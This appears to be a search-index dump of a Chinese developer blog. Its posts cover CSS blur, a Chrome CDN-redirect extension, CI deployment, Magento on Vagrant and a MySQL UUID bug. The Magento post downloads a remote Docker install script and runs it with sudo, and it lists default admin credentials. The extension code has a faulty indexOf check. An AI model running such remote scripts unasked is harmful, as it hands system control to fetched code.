这样实现的前提是，我们的背景是一个静态的，单一的图片，那么如果我们需要模糊的背景比较复杂呢？仔细观察QQ右栏的标题栏，和下方的应用 Dock，都是 iOS 常见的毛玻璃叠加层效果 ↓ 显然模糊元素本身并不能解决所有场景的问题。 为了能够实现类 iOS 的毛玻璃，我发现了两种方式—— 元素复制稍微研究就能发现，B站导航条的模糊，是用 两个相同的图片，以相同的坐标显示并叠加，再模糊上层的图片 实现的，那么同理，我们如果把整个页面的节点都复制一份，就能对局部模糊了。 第一步，将页面主体内容clone到navbar中，然后使用css3 -webkit-filter滤镜对内容做高斯模糊。第二步，监听页面滚动事件，计算出scrollTop，将navbar中的内容做同步滚动，同步滚动使用的方法是transform下面的translateY样式，对Y轴做同步偏移。 原文：https://www.jianshu.com/p/e65ae2fd8aea源码：https://github.com/LucienYang/blur_navDemo：https://lucienyang.github.io/blur_nav/ 要完整地复制页面元素，显而，性能会不好，这种方法仅适用于元素较少的网站，且实现比较复杂。但兼容性还是比方法2好的，而且……在没有方法2的情况下，能想到这个办法的人，真是天才…… backdrop-filter在浏览MIUI11官网时，无意发现了其导航栏的毛玻璃效果—— F12一下，找到了这个还不普及的 CSS 属性——“backdrop-filter”。 这是一个实验中的功能，Firefox 完全不支持，较旧的 Chrome 中需要在 flag 中手动开启，好消息是新版的 Chrome 已经默认支持了，让我们看到这个属性的兼容性会越来越高。 backdrop-filter CSS 属性可以让你为一个元素后面区域添加图形效果（如模糊或颜色偏移）。因为它适用于元素背后的所有元素，为了看到效果，必须使元素或其背景至少部分透明。 能够完美解决“模糊元素后面的内容”的需求，但目前兼容性欠佳，在本人的测试下： 兼容最新版 Chrome，以及 Chromium 版 Edge 兼容 Safari，包括 iOS 上的 Safari 兼容 Windows 10 自带的 Edge（巨硬！争气了一回） 不兼容最新版 Firefox 不兼容 Android 上的 Chrome，也不兼容 UC 内核的夸克，也不兼容微信QQ一类 封面来源（Cover source）：P站 / 针眼kyoeye / 希儿希儿希儿 武神千万位，希儿第一位丽塔再插队，策划两行泪","link":"/2019/css-backdrop-blur/"},{"title":"编写Chrome插件将googleapis替换为国内可访问的CDN","text":"由于公司不能安装梯子，所以不能访问谷歌商店，平时频繁地要访问国外的AngularJS网站，比如AgGrid，AngularJS Material，AngularJS官网等，很多用了Google的CDN源，页面就无法正常加载。 一开始的思路是改host文件，但是我们没有Google CDN的证书，会造成证书错误。 参考并优化了：https://github.com/justjavac/ReplaceGoogleCDN ，动手写了一个Chrome插件，对所有特定请求重定向，解决痛点！ 新建2个文件，放在同目录下。 manifest.json12345678910111213141516{ &quot;name&quot;: &quot;googleapis replacer&quot;, &quot;version&quot;: &quot;0.1&quot;, &quot;manifest_version&quot;: 2, &quot;description&quot;: &quot;googleapis replacer&quot;, &quot;background&quot;: { &quot;scripts&quot;: [ &quot;main.js&quot; ] }, &quot;permissions&quot;: [ &quot;webRequest&quot;, &quot;webRequestBlocking&quot;, &quot;&lt;all_urls&gt;&quot; ]} main.js12345678910111213141516171819202122232425var rules = [ { &quot;s&quot;: &quot;ajax.googleapis.com&quot;, &quot;t&quot;: &quot;ajax.loli.net&quot; }, { &quot;s&quot;: &quot;fonts.googleapis.com&quot;, &quot;t&quot;: &quot;fonts.loli.net&quot; },];chrome.webRequest.onBeforeRequest.addListener( function (request) { var redirectUrl; var requestURL = request.url; for (var i in rules) { if (requestURL.indexOf(rules[i].s)) { redirectUrl = requestURL.replace(rules[i].s, rules[i].t); return { redirectUrl: redirectUrl }; } } }, { urls: [ &quot;*://ajax.googleapis.com/*&quot;, &quot;*://themes.googleusercontent.com/*&quot; ] }, [&quot;blocking&quot;]); 打开Chrome，输入: chrome://extensions/ 勾选Developer Mode 选择Load unpacked extension…然后定位到代码文件夹，确定 测试：尝试访问 https://ajax.googleapis.com/ajax/libs/angularjs/1.7.8/angular.js拓展：可以在rules中添加更多自定义的规则。 封面来源, Cover source: https://wallpapertag.com/google-chrome-wallpaper-background","link":"/2019/googleapis-replacer/"},{"title":"工作两年之余翻起高中写的代码……","text":".heimu { color: #000; background-color: #000; } .heimu:hover { color: #fff; } 许久没再打开过的QQ空间突然有了提示，打开看到是母亲在翻我的软件相册，里面是些高中做出来的东西。 学业那么紧张的情况下，有时间接触手机电脑，甚至还写代码，在我们那个年代，绝对不是随便哪个学生都有的经历。 有初中时候写收菜脚本的基础，我对逻辑有了一定的理解并逐渐着迷，但又没有系统的教学，写出来的东西甚是粗糙。那时候学习 VB 仅仅是看一张名为开天辟地的电脑速成光盘，早期甚至都没有宽带网。不知道如何解析 HTML，就用字符串查找函数；不知道如何模块化编程，就一个文件写 800 多行；不知道如何定位异常，就给每一行代码开头加行号；不知道怎么做安装程序，就写 bat 脚本用 RAR 打自解压包；不知道怎么读写配置文件，就用基本输入输出 txt；甚至一开始连缩进都不懂，代码直上直下的…… 虽然走过这么多的弯路，还影响了高中学习险些没有考上本科，但收获了许多课堂里学不来的东西。 这月初的时候，我在整理一块老硬盘，把高中写的 班班通助手 和 班班通助手2.0 传到了 Github 上保存。我终究还是怕在硬盘里哪一天它就那样丢失了。 在 失去理智注意力涣散 的时候，想想曾经为之着迷的自己，至少还是很励志的。 来看看当时的自己给班班通助手做的宣传PPT吧！ 注：此处下载地址 wodemo.com 我的磨是当时比较流行的用于分享软件的网盘，和现在的蓝奏云差不多的性质，现在我的磨已经无法打开了。 UI 截图 ↓ 还有另一个班的同学模仿做出来的 ↓ 当时的电教柜是威科姆 VCOM 提供的触屏投影式电脑，所以对触屏优化就借鉴 Win8 ↓ 为了分享到别的班，甚至做出了安装向导和设置向导 ↓ 配套的小工具们 ↓ 这是改了很多版越来越沙马特的 v1 版本 😂 ↓ 当时的感想（817 行现在看好像不多也 😂） ↓ 为了方便班里的小吧主同学管理贴吧做的 ↓ 以及做了一半因为高考而夭折的 SNS 聚合软件 ↓","link":"/2019/easy-teach/"},{"title":"GitHub Page配置CDN遇到无限301重定向（HTTP ERROR 564）","text":"今天发现腾讯云上有免费的CDN流量，就尝试给自己的Github Page用上，配置好后却一直301重定向，毕竟Github服务器不是自己的，配置和log都看不了，那为什么一直301呢？ 给腾讯云CDN提交工单，客服查了一下（不到10分钟），发现是HTTPS的问题。 客服回复： 您好，这边核实您的域名由于源站开启了强制跳转https，访问反复重定向跳转，建议您登陆CDN控制台配置https证书，并通过如下两种方式解决：1、如您的源站配置了https证书，您可以将回源方式更改为协议跟随；2、如您的源站未配置https证书，建议您将源站的强制跳转https关闭。 原来 Github Page 支持一键HTTPS 开启后全站会启用HTTPS，且HTTP请求会301重定向到HTTPS 而CDN默认会通过HTTP回源，就无限301了。 解决方法很简单，在CDN中配置HTTPS，上传证书，回源方式更改为协议跟随（HTTPS请求回源也HTTPS）。 或者关闭Github Page的HTTPS开关（不推荐） 参考文章：https://yq.aliyun.com/articles/514723 协议跟随回源功能其含义通过一句话来描述即是根据客户端到CDN的请求协议决定CDN回源请求的协议。因此该功能主要是在CDN开启HTTPS协议后，客户端是可以同时支持发送HTTP或者HTTPS协议到CDN节点上请求数据的。 二、常见问题2、源站取消强制跳转设置。开启CDN后建议HTTP和HTTPS协议间的强制跳转功能由CDN的强制跳转功能实现，避免源站再开启强制跳转功能出现重复跳转。","link":"/2019/gp-qcloud-cdn/"},{"title":"Hamcrest 学习笔记","text":"TODO JunitJUnit框架用一组assert方法封装了一些常用的断言。这些assert方法可以帮我们简化单元测试的编写。这样的话，Junit就可以根据这些断言是否抛出 AssertionFailedError 错误来判断测试用例的执行结果。 Hamcrest使用过Junit 的应该有过体验：在实际开发中，一些基本的断言，如eqaul,null,true它们的可读性并不是很好。而且很多时候我们要比较对象、集合、Map等数据结构。这样我们要么进行大段的字段获取再断言。或者干脆自己编写表达式并断言其结果。JUnit4.4引入了Hamcrest框架，Hamcest提供了一套匹配符Matcher，这些匹配符更接近自然语言，可读性高，更加灵活。 Hamcrest 提供了大量被称为“匹配器”的方法。其中每个匹配器都设计用于执行特定的比较操作。Hamcrest的可扩展性很好，让你能够创建自定义的匹配器。最重要的是，JUnit也包含了Hamcrest的核心，提供了对Hamcrest的原生支持，可以直接使用Hamcrest。当然要使用功能齐备的Hamcrest，还是要引入对它的依赖。 Tutorial: http://hamcrest.org/JavaHamcrest/tutorialAPI: http://hamcrest.org/JavaHamcrest/javadoc/2.1/ Utils.java123456789101112131415161718192021222324import java.util.ArrayList;import java.util.List;public class Utils { public static List&lt;Integer&gt; fibonacci(int n) { int a = 1, b = 1, c = 0; List&lt;Integer&gt; result = new ArrayList&lt;&gt;(); for (int i = 1; i &lt;= n; i++) { if (i == 1) { result.add(a); } else if (i == 2) { result.add(b); } else { c = a + b; a = b; b = c; result.add(c); } } return result; }} UtilsTest.java1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import org.junit.Assert;import org.junit.Before;import org.junit.Test;import java.util.Arrays;import java.util.List;import static Matchers.ListMatcher.aList;import static Matchers.NumberMatcher.aNumber;import static org.hamcrest.MatcherAssert.assertThat;import static org.hamcrest.Matchers.*;public class UtilsTest { private List&lt;Integer&gt; expected; @Before public void initExpected() { expected = Arrays.asList(1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987, 1597, 2584, 4181, 6765, 10946, 17711, 28657, 46368); } @Test public void testFibonacciByJunit() { List&lt;Integer&gt; actual = Utils.fibonacci(expected.size()); // Way 1 Assert.assertEquals(expected.size(), actual.size()); int index = 0; for (Integer expect : expected) { Assert.assertEquals(expect, actual.get(index)); index++; } // Way 2 Assert.assertEquals(expected, actual); } @Test public void testFibonacciByHamcrest() { List&lt;Integer&gt; actual = Utils.fibonacci(expected.size()); // Way 3 assertThat(actual, not(aNumber())); assertThat(actual, is(aList())); assertThat(actual, equalTo(expected)); }} Matchers/NumberMatcher.java123456789101112131415161718192021package Matchers;import org.hamcrest.Description;import org.hamcrest.Matcher;import org.hamcrest.TypeSafeMatcher;public class NumberMatcher extends TypeSafeMatcher { public void describeTo(Description description) { description.appendText(&quot;is a number&quot;); } public static Matcher aNumber() { return new NumberMatcher(); } @Override protected boolean matchesSafely(Object o) { return o instanceof Integer || o instanceof Double; }} Matchers/ListMatcher.java1234567891011121314151617181920212223package Matchers;import org.hamcrest.Description;import org.hamcrest.Matcher;import org.hamcrest.TypeSafeMatcher;import java.util.List;public class ListMatcher extends TypeSafeMatcher { public void describeTo(Description description) { description.appendText(&quot;is a list&quot;); } public static Matcher aList() { return new ListMatcher(); } @Override protected boolean matchesSafely(Object o) { return o instanceof List; }} harmcrest的核心类从Matchers转为CoreMatchers。用户在使用的时候需要注意更新。 当使用assertThat时，静态导入时，导入的路径变为： 1import static org.hamcrest.CoreMatchers.*; 封面来源: pixabay, free for commercial use.","link":"/2019/hamcrest-summary/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2019/hello-world/"},{"title":"Netlify 初体验——真就是几秒部署呗","text":"Hexo 部署依赖 node 环境就让很多专注写作的人放弃这个框架，劝退萌新，并且难以随时随地写作。好在其 CLI 比较简单，前面我也介绍过如何利用免费的微软 Azure 持续部署博客。 不过今天看 Ant Design Pro 官网的 footer 的时候发现了 Netlify 这个东西，试了以后，强烈安利！！！ 来到它的首页，里面有这么几段话—— 大字： 在几秒钟内部署您的网站* 小字： *不，这里没有陷阱。真的只需点击几下。 嗯……嗯？哼哼……有免费套餐，试试吧！ 首先用 GitHub 授权登录 选择 New site from Git 选择项目托管的位置：GitHub 授权 GitHub 访问私有项目 输入构建命令……等等，你怎么给我自动输入了啊喂？ 点 Deploy site 然后构建就启动了，1分钟后我的站点就到了 Netlify 上。 当时我的表情是 (⊙o⊙)？ 我连部署命令都没打；我连环境都没提供；我甚至全程没有摸一下键盘……（你要问我注册登录不摸键盘？真就没摸，GitHub 是已登录的状态，点一下授权按钮就登录了。）敢情 hexo 的部署配置，Azure 的 CICD 都白写了呗？ …… 😓，流批…… 这个网站还支持绑定域名，自动申请 HTTPS，配 Web Hook（就不用手动点部署了），还有很多很多真 · 自动化的功能，大家一起发掘吧！","link":"/2019/hello-netlify/"},{"title":"Node.js 实现 HTTP 访问日志","text":"越来越咸，两个月没发文章了，刚刚换项目了，开始学一些新的知识。近来调试 webhook 和 http callback 比较多，想要使用 Node.js 写一个接收所有 HTTP 请求，并把请求头和请求体写进log，返回 200 OK 的 service。 其实就是简单的 access.log 啦。其实就是刚学习 Node.js 写的 demo 啦。啊这是很简单你不要拆穿啦。 这是输出的 log 的样子，优化了可读性，时间、method、path、URL参数（Query）、请求头（Header）、请求体（Body）都详细记录了： 1234567891011121314151617181920info: 2019-07-25 18:04:36 POST /v1.0/standard Query: search: keyword Header: cache-control: no-cache postman-token: f4103067-4b07-447d-9fab-f09a75b6ddda content-type: application/json user-agent: PostmanRuntime/3.0.11-hotfix.2 accept: */* host: localhost:4000 accept-encoding: gzip, deflate content-length: 209 connection: keep-alive Body: appId: XXX data: userId: 123 requestId: 456 timestamp: 0 依赖配置： | 包 | 作用 || - | - | - || body-parser | 转换form表单、json等格式的请求体 || express | 启http服务 || moment | 时间格式化 || winston | 打log | package.json1234567891011121314{ &quot;name&quot;: &quot;httplog&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;Log all http request to the service&quot;, &quot;main&quot;: &quot;app.js&quot;, &quot;author&quot;: &quot;iMaeGoo&quot;, &quot;license&quot;: &quot;MIT&quot;, &quot;dependencies&quot;: { &quot;body-parser&quot;: &quot;^1.19.0&quot;, &quot;express&quot;: &quot;^4.17.1&quot;, &quot;moment&quot;: &quot;^2.24.0&quot;, &quot;winston&quot;: &quot;^3.2.1&quot; }} app.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475const express = require('express')const bodyParser = require('body-parser')const winston = require('winston')const moment = require('moment')const app = express()const port = 4000const logger = winston.createLogger({ level: 'info', format: winston.format.simple(), transports: [ new winston.transports.File({ filename: 'http.log' }), new winston.transports.Console() ]});app.use(bodyParser.json({ type: 'application/json'}))app.use(bodyParser.urlencoded({ type: 'application/x-www-form-urlencoded'}))app.use(bodyParser.text({ type: '*/*'}))app.get('*', reqHandler)app.post('*', reqHandler)app.put('*', reqHandler)app.delete('*', reqHandler)app.listen(port, () =&gt; console.log(`listening &amp; logging on port ${port}`))function reqHandler(req, res) { logger.info(formatReq(req)) res.send('OK')}function formatReq(req) { let logStr = getStandardDateTime() logStr += `\\n\\t${req.method} ${req.path}` logStr += `\\n\\tQuery:` logStr += `${toString(req.query, 2)}` logStr += `\\n\\tHeader:` logStr += `${toString(req.headers, 2)}` if (req.method !== 'GET') { logStr += `\\n\\tBody:` if (req.body instanceof Object) { logStr += `${toString(req.body, 2)}` } else { logStr += `\\n\\t\\t${req.body}` } } return logStr}function getStandardDateTime(date) { return moment(date).format('YYYY-MM-DD HH:mm:ss')}function toString(obj, tabCount = 2) { let str = '' let item for (let key in obj) { item = obj[key] str += '\\n' for (let i = 0; i &lt; tabCount; i++) { str += '\\t' } str += `${key}:` if (item instanceof Object) { str += toString(item, tabCount + 1) } else { str += ` ${item}` } } return str} 之后安装依赖，运行： 12npm installnode app.js Spring Boot 也可以很简单实现，谁来写一下？","link":"/2019/http-log/"},{"title":"使用Termux在Android手机上搭建、编辑Hexo博客","text":"高级终端Termux是个强大的终端模拟器，这样的应用应该特别适合不喜欢图形界面的命令行爱好者，组合了强大的终端模拟和拓展Linux包收集支持。 享受bash和zsh。 使用nano和vim编辑文件。 通过ssh访问服务器。 使用gcc和clang编译代码。 使用python控制台来作为口袋计算器。 使用git和subversion检查项目。 使用frotz运行基于文本的游戏。 Step: 在Google Play或酷安搜索Termux安装，link：https://play.google.com/store/apps/details?id=com.termuxhttps://www.coolapk.com/apk/com.termux 打开Termux，更新软件源 12apt updateapt upgrade -y 安装相关软件 12apt install gitapt install nodejs 检查node和npm是否安装成功以及版本 1234node --versionv11.13.0npm --version6.7.0 克隆代码（将仓库地址换掉） 123git clone https://github.com/imaegoo/imaegoo.github.edit.gitcd imaegoo.github.editgit clone https://github.com/imaegoo/hexo-theme-icarus.git themes/icarus 安装npm依赖 12npm install -g hexo-clinpm install 启动Hexo 12hexo ghexo s 附录： Q：如何调出Ctrl, Alt等按键？A：屏幕左边缘向右划动呼出边栏，长按KEYBOARD。 Q：Termux系统的根文件夹在哪里？A：/data/data/com.termux/files/，可以使用root explorer等访问。 截图：","link":"/2019/hexo-on-android/"},{"title":"给Hexo博客配置Azure CI持续集成实现自动部署","text":"封面来源: 10th Magnitude 这是篇瞎球折腾笔记。CI是个好东西，前段时间看了一本关于DevOps的书，对持续集成有了一定了解。Hexo博客本身拥有很简洁的编译、部署过程： 12hexo ghexo d 但是简单的基础是前戏太多：配置SSH，拉项目，拉子模块，安装NodeJS，安装脚手架，安装依赖……虽然命令多，但是比较单一，便首先想到了给Hexo写CI脚本。 使用的第一个平台是腾讯云开发者平台（dev.tencent.com），它提供基于Jenkinsfile的持续集成beta版本**优点：**免费，全中文界面，配置简单易于上手，支持Jenkins，国内服务速度快**缺点：**目前功能较少，不支持上传secret files，无法配置SSH，npm依赖下载缓慢 hexo d命令是需要调用git push的，不支持SSH就凉了，过程就不讲了，在经过一番折腾后，我选择放弃了这个平台。 第二选择是自己搭建Jenkins，一番折腾后，发现自己的VPS性能太差，而且Windows版一些配置难以用配置文件完成，要手动配置，考虑到未来迁移起来会困难，逐放弃…… **优点：**完全免费，网上资料丰富**缺点：**配置复杂，需要自行搭建，性能依赖于VPS性能 最后成功地在巨硬（Microsoft）Azure DevOps上配置好了，跟大家分享步骤！ **优点：**免费（一个月1800分钟、1个并行job），runner质量高，配置方便**缺点：**Web hook不稳定，2次遇到GitHub调不通而没有自动触发Trigger的情况，与其他CI配置不兼容，参考资料较少 用微软账户登录 https://dev.azure.com/ 根据向导，新建一个组织（organization），在组织中新建一个项目（project） 根据向导，授权GitHub（或其他源代码管理平台）访问自己的Hexo项目 在项目设置（Project settings - Azure DevOps services）中，启用Pipelines 进入Pipelines，新建Build 有一些模板，但是没有关于Hexo的，自己根据过程写一个： azure-pipelines.yml1234567891011121314151617181920212223242526272829303132333435363738trigger:- master # Hexo 原项目分支名pool: vmImage: 'Ubuntu-16.04' # 运行环境steps:- task: NodeTool@0 # 安装NodeJS inputs: versionSpec: '10.x' displayName: 'Installing Node.js...'- task: InstallSSHKey@0 # 导入SSH inputs: hostName: github.com,52.74.223.119 ssh-rsa AAAAB3... # 对应known_hosts sshPublicKey: ssh-rsa AAAAB3... # 对应id_rsa.pub sshKeySecureFile: id_rsa # 对应私钥文件名 displayName: 'Installing SSH...'# 安装Hexo脚手架，Hexo依赖- script: | npm install -g hexo-cli npm install displayName: 'Installing dependencies...'# 清理（可选），生成public静态目录（可选）- script: | hexo clean hexo g displayName: 'Building...'# 这里由于我有两个page托管仓库需要部署，所以需要添加 git.dev.tencent.com 的 fingerprint 到 known_hosts- script: | ssh-keyscan -t rsa git.dev.tencent.com &gt;&gt; ~/.ssh/known_hosts git config --global user.name &quot;imaegoo-az&quot; git config --global user.email &quot;mail1st@qq.com&quot; hexo d displayName: 'Deploying...' 保存到新分支并选择创建PR以便测试 右上角菜单中点击Triggers，如果有黄色提示GitHub web hook配置不正确，可以在这里选择自动修复 由于我的Hexo带有Icarus主题子模块，所以还需要进入YAML - Get sources下勾选“Checkout submodules” 然后点击左侧Pipelines - Library - Secure files上传私钥文件“id_rsa” 点击进入刚上传的私钥，选中“Authorize for use in all pipelines”以允许Build任务读取 尝试运行build 尝试push代码触发build 国外CI runner依赖下载速度甩了腾讯几条街，1分钟一次build，免费时间一个月是用不完的。 如果你遇到了部署失败，可以访问 Azure DevOps的帮助文档 中寻找答案，也欢迎粘贴log讨论！ 封面来源, Cover source: https://www.10thmagnitude.com/azure-devops-whats-in-a-rename/","link":"/2019/hexo-ci/"},{"title":"如何给 Icarus 增加夜间模式","text":"此篇针对 Icarus 2 版本，Icarus 3 请参考：Icarus 夜间模式支持 3.0 了 Preview Live Previewhttps://www.imaegoo.com/ AttentionThis extension is NOT FULLY TESTED, so it may not fully cover the theme styles, if you find something wrong (such as bright things in night mode), please report it in this issue, do not open new issue. Usage Merge night branch from imaegoo/hexo-theme-icarus into your icarus theme folder, or dowmload zip. If you configured an image logo, you should prepare a logo for night mode, then apply them in themes/icarus/_config.yml. 123logo: light: /images/logo.png dark: /images/logo-dark.png 把 night 分支（imaegoo/hexo-theme-icarus）合并到你的主题分支中。如果你不懂，并且你对主题没有自己修改，直接下载修改好压缩包。 如果你的网站 LOGO 是图片，你可能需要准备一黑一白两个版本的 LOGO，并在主题 themes/icarus/_config.yml 中配置。 123logo: light: /images/logo.png dark: /images/logo-dark.png ModifyIf you want to customize your theme, you can modify night mode part in themes/icarus/source/css/style.styl. ThanksUniverse background from https://github.com/fan-lv/Fan","link":"/2019/icarus-night-mode-2/"},{"title":"Icarus 夜间模式（实验中）","text":"更新了 Icarus 主题代码，右上角增加了夜间模式切换按钮，是实验中的功能，欢迎体验。 通过向 body 添加名为 night 的 class 实现，状态记在浏览器 localstorage 中。 已知问题： 样式可能没有全面覆盖。 夜间模式在低性能浏览器上导致页面响应缓慢，需要优化性能。 目前还没有做成插件，仅在自己的博客使用，后期如果有时间的话，会考虑做成 extension。 更新：已经发布了—— Icarus 2 请参考：如何给 Icarus 增加夜间模式Icarus 3 请参考：Icarus 夜间模式支持 3.0 了","link":"/2019/icarus-night-mode/"},{"title":"Windows 下通过 Vagrant 简单搭建 Magento","text":"准备软件 VirtualBox 5.2.8 Vagrant 2.0.1 官网下载安装，比我的新即可，安装路径自选。 创建 Vagrantfile新建文件夹并创建 Vagrantfile 放在里面，我配置的环境是 Ubuntu 16.04，内存8G，可以换成自己熟悉的环境。映射端口80，443（Web），3306（数据库），9200，9300（搜索引擎）。 Vagrantfile1234567891011Vagrant.configure(&quot;2&quot;) do |config| config.vm.box = &quot;ubuntu/xenial64&quot; config.vm.network &quot;forwarded_port&quot;, guest: 80, host: 80 config.vm.network &quot;forwarded_port&quot;, guest: 443, host: 443 config.vm.network &quot;forwarded_port&quot;, guest: 3306, host: 3306 config.vm.network &quot;forwarded_port&quot;, guest: 9200, host: 9200 config.vm.network &quot;forwarded_port&quot;, guest: 9300, host: 9300 config.vm.provider &quot;virtualbox&quot; do |vb| vb.memory = &quot;8192&quot; endend 启动并连接到虚拟机在 Vagrantfile 所在目录执行 cmd12vagrant upvagrant ssh 虚拟机中安装 dockerbash123curl -fsSL https://get.docker.com -o get-docker.shsudo sh get-docker.shsudo apt-get install docker-compose 将当前用户加入 docker 用户组bash1234sudo usermod -aG docker $USER# 需要断开并重新连接以生效exitvagrant ssh 设置修改 VMA（虚拟内存区域）数值以保证 Elastic Search 可以顺利启动 bash1sudo sysctl -w vm.max_map_count=262144 部署 Magento, MariaDB, Elastic Search使用官方一键部署脚本部署。 bash12curl -sSL https://raw.githubusercontent.com/bitnami/bitnami-docker-magento/master/docker-compose.yml &gt; docker-compose.ymldocker-compose up -d 查看运行状态bash123456docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES50d5ccd79dbf bitnami/magento:2 &quot;/app-entrypoint.sh …&quot; 6 hours ago Up 6 hours 0.0.0.0:80-&gt;80/tcp, 0.0.0.0:443-&gt;443/tcp vagrant_magento_158577f4b0595 bitnami/mariadb:10.2 &quot;/entrypoint.sh /run…&quot; 7 hours ago Up 6 hours 3306/tcp vagrant_mariadb_13c217cc1492e bitnami/elasticsearch:6 &quot;/entrypoint.sh /run…&quot; 7 hours ago Up 7 hours 9200/tcp, 9300/tcp vagrant_elasticsearch_1 在 Windows 中打开 http://127.0.0.1，检查是否能够正常访问。 默认后台：http://127.0.0.1/index.php/admin/默认用户：user默认密码：bitnami1 遇到问题 执行 docker logs [容器ID] 查看 log 查看官方文档：https://github.com/bitnami/bitnami-docker-magento/blob/master/README.md","link":"/2019/install-magento-on-windows/"},{"title":"MySQL JDBC 在查询中调用 REPLACE(UUID(),&#39;-&#39;,&#39;&#39;) 查出重复的 UUID","text":"MySQL版本是5.7.25，最近升级了JDBC驱动，5.1.45 -&gt; 8.0.13，导致一个SQL报异常，SQL是用一个子查询，拿到数据后插入到另一张表用的。 123INSERT INTO table_2 (id, title, modified_date)(SELECT REPLACE(UUID(),'-','') AS id, table_1.title AS title, NOW() AS modified_dateFROM table_1) 可见table_2的id是在子查询中，用REPLACE(UUID(),'-','')生成的。 这样的语句在MySQL 5.7.25命令行模式下，Workbench下，JDBC 5.1.45下都没有问题，但是JDBC升级到8.0.13后，却报了主键重复的异常。 ERROR SqlExceptionHelper - Duplicate entry 'ae3867585cc611e986e30e045157562c' for key 'PRIMARY' 于是搜索，在Stack Overflow上搜索到了相关问题，注意最佳答案似乎不准确，但后面的一个答案给予了我一些启示。 https://stackoverflow.com/questions/9750536/mysql-uuid-duplication-bug uuid()output is utf8, no matter what your charset is ; when your charset client and charset result is some of high priority than utf8 such as utf8mb4 , then the inexplicit conversion happen,other lower priority charset like latin1 that work fine; inexplicit conversion will turn uuid() into constant string before sql execute,so after sql execute finish , the same uuid() return 新建一个工程，写一个简单的JDBC demo，从MySQL查询SELECT REPLACE(UUID(),'-','') from settings 当JDBC版本为5.1.45时 当JDBC升级到8.0.13时，相同的查询语句，返回了不一样的结果 隐式转换会将UUID()的返回值从UTF8转换成优先级更高的UTF8MB4，转换过程导致结果成为了常量。 推荐的解决办法是： 将隐式转换改为显式转换例如： 12REPLACE(CONVERT(UUID() USING utf8mb4), '-', '')REPLACE(UUID(), _utf8'-', _utf8'') 两条语句都可以。 那就这样改呗，又发现Hibernate会对以上statement自动预处理成以下的样子 12REPLACE(CONVERT(UUID() USING[*] utf8mb4),'-','')REPLACE(UUID(),_UTF8'-'[*],_UTF8'') 这显然会造成语法错误啊！ 尴尬，继续搜索了为什么Hibernate会往查询语句里加[*]，没有找到答案，最接近的问答在这里：https://stackoverflow.com/questions/55040454/cant-find-an-error-in-sql-update-statement 在数据库连接字符串中加入&amp;connectionCollation=utf8_general_ciMySQL Connector/J 8.0 Developer Guide / Connector/J Reference / Using Character Sets and Unicodehttps://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-charsets.html 因为没有utfmb3可以与连接选项charaterEncoding一起使用的Java样式字符集名称 ，所以utf8mb3用作连接字符集的唯一方法是对连接选项使用utf8mb3 collation（例如utf8_general_ci）的connectionCollation，这会强制设置utf8mb3字符集如上一篇文章中所解释的那样使用。 1234String jdbcUrl = &quot;jdbc:mysql://localhost:3306/test&quot; + &quot;?useUnicode=true&quot; + &quot;&amp;characterEncoding=UTF-8&quot; + &quot;&amp;connectionCollation=utf8_general_ci&quot;; 因为新版的JDBC默认连接编码为UTF8MB4这会让JDBC连接时不再执行SET NAMES utf8mb4 已在上面的demo中测试这是起作用的。 但是： 对于大项目修改连接字符串的风险比较高； UTF8MB4可以存储和传输emoji表情，拥有更良好的兼容性，退到UTF8MB3不是好策略。 去掉REPLACE()函数最后还是整个去掉了REPLACE…… 123INSERT INTO table_2 (id, title, modified_date)(SELECT UUID() AS id, table_1.title AS title, NOW() AS modified_dateFROM table_1) 注：因为ID是VARCHAR(45)的，所以能装得下UUID()的返回值。 附：经不完全测试，存在此问题的函数12REPLACE(UUID(),'-','')CONCAT(UUID(),'-') 不存在此问题的函数 1SUBSTRING(UUID(),1,36)","link":"/2019/jdbc-uuid-duplication/"},{"title":"JS 原生对象与数组拷贝","text":"浅拷贝单层对象12let obj = { id: 1, title: &quot;1&quot; }let copyOfObj = Object.assign({}, obj) 深拷贝多层对象1234567let obj = { id: 1, title: &quot;1&quot;, tag: ['js', 'javascript'], category: { id: 1001, title: 'frontend' }}let copyOfObj = JSON.parse(JSON.stringify(obj)) 浅拷贝简单类型数组12let arr = [1, 2, 3]let copyOfArr = [...arr] 深拷贝单层对象组成的数组1234567let arr = [ { id: 1, title: &quot;1&quot; }, { id: 2, title: &quot;2&quot; }, { id: 3, title: &quot;3&quot; }]let copyOfArr1 = arr.map((item) =&gt; Object.assign({}, item))let copyOfArr2 = JSON.parse(JSON.stringify(arr)) 深拷贝多层对象组成的数组1234567let arr = [ { id: 1, title: &quot;1&quot;, subObj: { name: 'subObj1' } }, { id: 2, title: &quot;2&quot;, subObj: { name: 'subObj2' } }, { id: 3, title: &quot;3&quot;, subObj: { name: 'subObj3' } }]let copyOfArr1 = arr.map((item) =&gt; JSON.parse(JSON.stringify(item)))let copyOfArr2 = JSON.parse(JSON.stringify(arr)) 总结不考虑性能的情况下，JSON.parse(JSON.stringify(value))是最简最万能的拷贝。","link":"/2019/js-deep-copy/"},{"title":"负载均衡：ELB, ALB, NLB, CLB","text":"负载均衡的作用对多台云服务器进行流量分发的服务。负载均衡可以通过流量分发扩展应用系统对外的服务能力，通过消除单点故障提升应用系统的可用性。 提高可用性和访问速度在单个可用区或多个可用区内的多个目标之间自动分配流量。 运行状况检查检测无法正常运行的目标、停止向它们发送流量，然后将负载分散到剩余的正常运行的目标上。 安全性功能创建和管理与负载均衡器关联的安全组，以提供更多联网和安全选项。 TLS 终止提供集成化证书管理和 SSL/TLS 解密，可以灵活地集中管理负载均衡器的 SSL 设置，并从应用程序上卸载 CPU 密集型工作。 Amazon 提供的 ELB 服务包含三种类型：ALB, NLB, CLB。 ALBApplication Load Balancer 运行于请求级别（第 7 层），可根据请求的内容将流量路由至 EC2 实例、容器、IP 地址和 Lambda 函数等目标。Application Load Balancer 最适合 HTTP 和 HTTPS 